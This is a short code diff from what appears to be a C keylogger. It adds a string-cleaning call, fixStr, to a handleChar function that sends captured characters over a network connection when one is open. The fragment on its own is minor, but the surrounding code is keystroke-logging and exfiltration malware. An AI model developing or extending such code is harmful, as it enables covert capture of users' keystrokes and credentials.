@@ -10,6 +10,7 @@
 #include "inet_utils.h"
 #include "x_utils.h"
 #include "file_utils.h"
+#include "utils.h"
 #include "keylog.h"
 
 int sendMissingStuff() {
@@ -27,6 +28,8 @@ int sendMissingStuff() {
 }
 
 void handleChar(int connected, char *buf) {
+	fixStr(buf);
+
 	if(connected)
 		sendStr(buf);
 	else
